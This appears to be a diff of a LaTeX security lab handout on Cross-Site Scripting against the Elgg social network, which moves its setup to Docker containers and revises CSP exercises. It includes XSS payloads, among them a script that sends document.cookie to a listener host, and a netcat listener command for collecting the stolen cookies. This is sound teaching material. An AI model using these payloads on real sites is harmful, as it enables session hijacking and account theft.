@@ -84,34 +84,87 @@ Detailed coverage of the Cross-Site Scripting attack can be found in the followi
 % *******************************************
 % SECTION
 % ******************************************* 
-\section{Lab Environment}
-
-This lab can only be conducted in our Ubuntu 16.04 VM, because of the configurations that we
-have performed to support this lab. We summarize these configurations in this 
-section. 
+\section{Lab Environment Setup}
 
 
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\input{\webcommon/Web_Elgg_Setup}
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
-\paragraph{DNS Configuration.}
-We have configured the following URL needed for this lab. 
-The folder where the web application is installed and the URL to access this web application are
-described in the following:
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{Container Setup and Commands}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{\commonfolder/container/setup}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{Elgg Web Application}
+
+
+We use an open-source web application called {\tt Elgg} in this lab.
+{\tt Elgg} is a web-based social-networking application.
+It is already set up in the provided container images.
+We use two containers, one running the web server (\texttt{10.9.0.5}) ,
+and the other running the MySQL database (\texttt{10.9.0.6}). 
+The IP addresses for these two containers are hardcoded in various 
+places in the configuration, so please do not change them from
+the \texttt{docker-compose.yml} file. 
+
+
+
+\paragraph{The Elgg container.}
+We host the Elgg web application using the Apache web server. 
+The website setup is included in 
+\texttt{apache\_elgg\_xss.conf} inside the Elgg image folder. 
 
 \begin{lstlisting}
-  URL: http://www.xsslabelgg.com
-  Folder: /var/www/XSS/Elgg/
+<VirtualHost *:80>
+     DocumentRoot /var/www/elgg
+     ServerName http://www.xsslabelgg.com
+     <Directory /var/www/elgg>
+          Options FollowSymlinks
+          AllowOverride All
+          Require all granted
+     </Directory>
+</VirtualHost>
+\end{lstlisting}
+ 
+
+
+\paragraph{DNS configuration.} 
+We access the Elgg website on the VM using 
+the \url{http://www.xsslabelgg.com} URL.
+The URL is only accessible from inside of the virtual machine, because we
+have modified the \texttt{/etc/hosts} file to map the hostname
+of the URL to the IP address \texttt{10.9.0.5}:
+
+\begin{lstlisting}
+10.9.0.5   www.xsslabelgg.com
 \end{lstlisting}
 
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\newcommand{\urlorurls}{URL }
-\newcommand{\urlisorurlsare}{URL is }
-\input{\webcommon/Web_DNS_Setup}
-\input{\webcommon/Web_Apache_Setup}
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
+
+\paragraph{MySQL database.} 
+In our container setup, the MySQL database stores data 
+in the \texttt{mysql\_data} folder (inside \texttt{Labsetup})  
+on the host machine (the 
+folder will be created after the MySQL container runs once). 
+This way, even if the MySQL container is destroyed, the 
+data in the database are still kept. If you do want to start from a clean
+database, you can remove this folder:
+
+\begin{lstlisting}
+$ sudo rm -rf mysql_data
+\end{lstlisting}
+ 
+ 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{\webcommon/elgg_accounts}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
 
 % *******************************************
@@ -146,7 +199,7 @@ The objective of this task is to embed a JavaScript program in your
 the JavaScript program will be executed and an alert window
 will be displayed. The following JavaScript program will display an alert window: 
 \begin{lstlisting}
-    <script>alert('XSS');</script> 
+<script>alert('XSS');</script> 
 \end{lstlisting}
 If you embed the above JavaScript code in your profile (e.g. in the brief
 description field), then any user who views your profile will see the alert window. 
@@ -158,9 +211,9 @@ JavaScript program in a standalone file, save it with the .js extension, and
 then refer to it using the {\tt src} attribute in the {\tt <script>} tag. 
 See the following example:
 \begin{lstlisting}
-    <script type="text/javascript" 
-            src="http://www.example.com/myscripts.js">
-    </script>
+<script type="text/javascript" 
+        src="http://www.example.com/myscripts.js">
+</script>
 \end{lstlisting}
 In the above example, the page will fetch the JavaScript program from
 \url{http://www.example.com}, which can be any web server.
@@ -178,7 +231,7 @@ the user's cookies will be displayed in the alert window.
 This can be done by adding some additional code to
 the JavaScript program in the previous task:
 \begin{lstlisting}
-     <script>alert(document.cookie);</script> 
+<script>alert(document.cookie);</script> 
 \end{lstlisting}
 
 
@@ -207,9 +260,9 @@ attacker's machine (with IP address {\tt 10.1.2.5}), where the attacker has a TC
 listening to the same port.  
 
 \begin{lstlisting}
- <script>document.write('<img src=http://10.1.2.5:5555?c=' 
-                        + escape(document.cookie) + '   >'); 
- </script> 
+<script>document.write('<img src=http://127.0.0.1:5555?c=' 
+                       + escape(document.cookie) + '   >'); 
+</script> 
 \end{lstlisting}
 
 
@@ -220,11 +273,11 @@ client whatever is typed by the user running the server. Type the command below 
 port \texttt{5555}:
 
 \begin{lstlisting}
-$ nc -l 5555 -v
+$ nc -lnv 5555 
 \end{lstlisting}
 
 \noindent The "{\tt -l}" option is used to specify that nc should listen for an incoming
-connection rather than initiate a connection to a remote host. The "{\tt -v}" option is used to
+connection rather than initiate a connection to a remote host. The "{\tt -nv}" option is used to
 have \texttt{nc} give more verbose output.
 
 
@@ -263,7 +316,7 @@ provides guidelines on how to use the tool.
 
 
 Once we understand what the add-friend HTTP request look like, 
-we can write a Javascript program to send out the same HTTP request. We provide a skeleton
+we can write a JavaScript program to send out the same HTTP request. We provide a skeleton
 JavaScript code that aids in completing the task.
 
 \begin{lstlisting}
@@ -536,16 +589,15 @@ The \texttt{example60} and \texttt{example70} sites are
 used for hosting JavaScript code.  The 
 \texttt{example32a}, \texttt{example32b}, and 
 \texttt{example32c} are the three websites that 
-have different CSP setup. Details of the setup 
+have different CSP configurations. Details of the configuration 
 will be explained later.
 
 
 \paragraph{Changing the configuration file.}
-In the experiment, you need to modify the Apache 
-configuration file (\texttt{apache\_csp.conf}. If you make a modification
+In the experiment, you need to modify this Apache 
+configuration file (\texttt{apache\_csp.conf}). If you make a modification
 directly on the file inside the image folder, you need to rebuild the image
 and restart the container, so the change can take effect. 
-
 
 You can also modify the file while the container is running. 
 The downside of this 
@@ -568,7 +620,7 @@ We will access the above websites from our VM.
 To access them through their respective URLs, 
 we need to add the following three entries to the 
 \texttt{/etc/hosts} file, so these hostnames are mapped to 
-the IP address of our server container (\texttt{10.9.0.5}). 
+the IP address of the server container (\texttt{10.9.0.5}). 
 You need to use the root privilege to 
 change this file (using \texttt{sudo}).
 
@@ -650,7 +702,7 @@ use Apache to set CSP policies. In our configuration,
 we set up three websites, but only the second one sets 
 CSP policies (the lines marked by \ding{110}). 
 With this setup, when we visit \texttt{example32b}, 
-Apache will add the specified CSP header to all the 
+Apache will add the specified CSP header to all 
 the response from this site. 
 
 
@@ -688,7 +740,7 @@ file (marked by \ding{108}), we did not set up any CSP policy.
 However, instead of accessing \texttt{index.html}, the 
 entry point of this site is \texttt{phpindex.php}, which
 is a PHP program. This program, listed below, adds 
-a CSP header to the response. 
+a CSP header to the response generated from the program. 
 
 \begin{lstlisting}
 <?php
@@ -701,7 +753,7 @@ a CSP header to the response.
 
 <?php include 'index.html';?>
 \end{lstlisting}
- 
+
 
 
 % -------------------------------------------
@@ -721,23 +773,23 @@ the following URLs from your VM.
 
 \begin{enumerate}
 
-\item Describe and explain your observations when you visit the above three websites.
+\item Describe and explain your observations when you visit these websites.
 
-\item Click the button of in the web pages from all the three websites, describe and 
+\item Click the button in the web pages from all the three websites, describe and 
 explain your observations. 
 
 \item Change the server configuration on \texttt{example32b} (modify the Apache 
 configuration), so Areas 5 and 6 display OK. 
+Please include your modified configuration in the lab report.
 
 \item Change the server configuration on \texttt{example32c} (modify the PHP code), so 
-Areas 1, 2, 4, 5, and 6 all display \texttt{OK}. Please include your 
-modified configuration in the lab report.
+Areas 1, 2, 4, 5, and 6 all display \texttt{OK}. 
+Please include your modified configuration in the lab report.
 
-\item Please explain why would CSP help prevent Cross-Site Scripting attacks. 
+\item Please explain why CSP can help prevent Cross-Site Scripting attacks. 
 
 \end{enumerate}
  
-
 
 
 
